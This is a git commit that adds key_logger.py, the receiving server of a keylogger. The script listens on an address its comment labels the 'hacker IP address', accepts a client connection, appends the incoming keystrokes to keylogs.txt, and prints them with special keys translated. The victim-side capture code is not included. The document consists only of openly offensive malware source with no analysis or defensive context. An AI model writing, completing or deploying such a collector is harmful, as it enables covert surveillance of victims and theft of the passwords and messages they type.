fd2ab246df0be0edb6947b24cec794f3f546cd2c
Darryl <126213616+breeke@users.noreply.github.com>
2024-09-26 10:34:39 +0800

    Create key_logger.py

---
+++ key_logger.py
@@ -0,0 +1,50 @@
+import socket
+
+host = '192.168.56.104' #hacker IP address in string, actually don't need it
+port = 9999
+
+s = socket.socket()
+s.bind((host, port))
+s.listen(2)
+
+def file_write(keys):
+    with open("keylogs.txt","a") as file:
+        for key in keys:
+            file.write(key)
+
+print(host)
+conn, address = s.accept()
+print("Connected to Client: " + str(address))
+while True:
+    data = conn.recv(1024).decode()
+    file_write(str(data))
+    if not data:
+        break
+    if str(data) == 'Key.space':
+        data = ' '
+    if str(data) == 'Key.enter':
+        data = '\n'
+    if str(data) == 'Key.tab':
+        data = '\t'
+    if str(data) == 'Key.backspace':
+        data = ' [backspace] '
+    if str(data) == 'Key.shift' or str(data) == 'Key.shift_r':
+        data = ''
+    if str(data) == 'Key.ctrl' or str(data) == 'Key.ctrl_r':
+        data = ' [ctrl] '
+    if str(data) == 'Key.alt' or str(data) == 'Key.alt_r':
+        data = ' [alt] '
+    if str(data) == 'Key.cmd' or str(data) == 'Key.cmd_r':
+        data = ' [cmd] '
+    if str(data) == 'Key.caps_lock':
+        data = ' [caps lock] '
+    if str(data) == 'Key.left':
+        data = ' [left] '
+    if str(data) == 'Key.right':
+        data = ' [right] '
+    if str(data) == 'Key.up':
+        data = ' [up] '
+    if str(data) == 'Key.down':
+        data = ' [down] '
+    print(str(data).strip("'"), end='', flush=True)
+conn.close()
